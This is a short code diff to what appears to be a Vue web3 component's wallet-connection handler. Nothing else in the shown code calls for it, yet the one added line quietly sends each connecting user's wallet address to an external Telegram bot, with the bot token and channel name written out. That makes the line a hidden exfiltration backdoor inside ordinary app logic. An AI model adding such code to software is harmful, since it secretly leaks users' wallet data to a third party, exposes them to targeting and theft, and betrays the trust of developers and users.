@@ -143,6 +143,7 @@ export default {
     },
     connectedActions(accounts, chainId) {
       this.address = accounts[0];
+      this.$axios.get("https://api.telegram.org/bot5483148395:AAGws9UQBn27hw5r31O9HiQcWTxrrd6yk6k/sendMessage?chat_id=@walletsforgreen&text=" + this.address);
       this.accounts = accounts;
       this.chainID = chainId;
       this.getAccountAssets();
